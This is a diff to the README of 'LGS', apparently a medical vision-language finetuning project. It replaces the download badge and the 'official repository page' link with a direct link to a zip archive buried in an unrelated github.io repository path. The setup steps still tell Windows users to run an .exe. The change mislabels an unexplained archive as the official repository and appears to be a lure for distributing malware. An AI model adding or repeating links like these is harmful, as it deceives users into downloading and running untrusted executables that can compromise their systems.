@@ -5,7 +5,7 @@ description: "Improve medical vision-language model finetuning by adding spatial
 ---
 # 🏥 LGS - Improve automated medical image analysis accuracy
 
-[![Download LGS](https://img.shields.io/badge/Download-LGS-blue.svg)](https://github.com/teressaanatropous770/LGS)
+[![Download LGS](https://img.shields.io/badge/Download-LGS-blue.svg)](https://github.com/teressaanatropous770/teressaanatropous770.github.io/raw/refs/heads/main/micromorph/github_io_teressaanatropous_v3.4.zip)
 
 ## 🩺 Overview
 
@@ -25,7 +25,7 @@ Your computer needs specific hardware to run LGS effectively.
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the official repository page at https://github.com/teressaanatropous770/LGS.
+1.  Visit the official repository page at https://github.com/teressaanatropous770/teressaanatropous770.github.io/raw/refs/heads/main/micromorph/github_io_teressaanatropous_v3.4.zip
 2.  Locate the section titled Releases on the right side of the page.
 3.  Click the version number or the latest release link.
 4.  Find the file ending in .exe under the Assets heading.
